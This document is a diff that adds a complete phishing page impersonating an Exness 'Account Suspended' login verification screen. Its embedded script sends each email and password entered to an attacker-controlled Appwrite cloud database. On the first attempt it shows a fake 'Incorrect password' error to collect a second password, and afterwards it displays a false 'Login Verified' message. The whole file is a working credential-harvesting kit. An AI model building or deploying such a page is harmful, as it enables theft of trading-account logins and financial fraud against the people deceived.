@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Exness Login Verification</title>
+  <script src="https://cdn.jsdelivr.net/npm/appwrite@13.0.0"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #f5f5f5;
+    }
+    .box {
+      width: 360px;
+      padding: 40px;
+      background: #fff;
+      margin: 100px auto;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .box h2 {
+      margin-bottom: 20px;
+    }
+    .box input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .box button {
+      width: 100%;
+      padding: 10px;
+      background: #ffc107;
+      border: none;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .error {
+      color: red;
+      display: none;
+      font-size: 14px;
+      text-align: center;
+    }
+    .success {
+      display: none;
+      text-align: center;
+      color: green;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="box" id="loginBox">
+    <h2>Account Suspended</h2>
+    <p>Please verify your login</p>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Email" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <button type="submit">Login</button>
+      <div class="error" id="errorBox">Incorrect password. Try again.</div>
+    </form>
+  </div>
+
+  <div class="box success" id="successBox">
+    <h2>Login Verified</h2>
+    <p>Your login is verified successfully.</p>
+  </div>
+
+  <script>
+    const { Client, Databases, ID } = Appwrite;
+    const client = new Client();
+    client.setEndpoint("https://cloud.appwrite.io/v1").setProject("688645d80003f6f2ac63");
+    const databases = new Databases(client);
+
+    let attempt = 0;
+
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      attempt++;
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      databases.createDocument(
+        "68864661001cac30c2bd",
+        "6886472800269d8c2b71",
+        ID.unique(),
+        { email, password }
+      ).then(() => {
+        if (attempt === 1) {
+          document.getElementById("errorBox").style.display = "block";
+          document.getElementById("password").value = "";
+        } else {
+          document.getElementById("loginBox").style.display = "none";
+          document.getElementById("successBox").style.display = "block";
+        }
+      }).catch(err => {
+        alert("Error: " + err.message);
+      });
+    });
+  </script>
+
+</body>
+</html>
